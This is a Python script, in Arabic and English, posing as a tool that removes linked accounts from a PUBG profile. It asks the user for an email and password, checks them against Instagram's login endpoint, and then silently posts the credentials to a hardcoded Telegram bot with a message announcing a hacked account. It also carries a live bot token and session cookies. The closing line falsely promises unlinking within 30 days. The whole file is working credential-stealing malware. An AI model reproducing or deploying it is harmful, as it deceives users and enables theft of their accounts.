import requests, random, requests, json, pyfiglet,sys,time, os, uuid
os.system("pip install requests")
os.system("pip install random")
os.system("pip install json")
os.system("pip install pyfiglet")
os.system("pip install sys")
os.system("pip install time")
os.system("pip install uuid")
os.system("clear")
Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("P U B G")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ WELCOME IN PUBG 💘.   \n ⌯ اهلا بيك في اداة ازالة الربط
---------------------------------------------------
""")
uid = uuid
print('  ')
url_login = 'https://www.instagram.com/accounts/login/ajax/'
headers_login = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-length': '291',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
    'origin': 'https://www.instgram.com',
    'referer': 'https://www.instagram.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
    'x-csrftoken': 'COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': '1cb44f68ffec',
    'x-requested-with': 'XMLHttpRequest'
}
os.system("clear")		
print(a_bSa+ab)
slow(S_aBs+''' 
                    ⇦تويتر⌯  [ 1 ]
⇦ فيس بوك⌯  [ 2 ]
 كوكل⌯  [ 3 ]
 ⇦ ايميل ربط داخلي⌯  [ 4 ]
 ⇦ رقم ربط داخي⌯  [ 5 ]
   \n''')
Abs = input (''+Ba_bS+'  ⌯ اختر ما تريد  .\n ⌯ Choose the number of  want  :  '+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+'\n- اهلا بك عزيزي تم اختيار ازالة التويتر  Welcome.   ')
if (Abs == '2'):
	print(Ba_bS+'\n- اهلا بك عزيزي تم اختيار ازالة فيس بوك  Welcome.   ')
if (Abs == '3'):
	print(Ba_bS+'\n- اهلا بك عزيزي تم اختيار ازالة كوكل  Welcome.   ')
if (Abs == '4'):
	print(Ba_bS+'\n- اهلا بك عزيزي تم اختيار ازالة ايميل ربط داخلي  Welcome.   ')
if (Abs == '5'):
	print(Ba_bS+'\n- اهلا بك عزيزي تم اختيار ازالة رقم ربط داخلي  Welcome.   ')
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter email  :  '+faB_s)
print('  ')
password = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Password  :  '+faB_s)
data_login = {
    'username': username,
    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1613414957:{password}',
    'queryParams': '{}',
    'optIntoOneTap': 'false'
}
req_login = requests.post(url_login, data=data_login, headers=headers_login)
if '"authenticated":false' in req_login.text:
    print(''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Username or Password Is Error Try Agin . \n ⌯ اسم الستخدم او الباسورد خطأ اعد مره اخرۍ .')
    exit(0)
elif '"authenticated":true' in req_login.text:
    print(''+Ba_bS+'('+a_aB_s+'√'+S_aBs+')'+Ba_bS+'  ⌯ Done Login . \n ⌯ تم تسجيل الدخول بنجاح .')
ID = '746717321'
token = '6442739887:AAHrD5X8_LPO9tTkohGvjVhnMj_WObY34Vw'
t = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=تم اختراق حساب ببجي من \n USER - {username}\nPASSWORD - {password}\nPY :5r5_9 ")
print('سيتم الغاء الربط خلال30 يوم')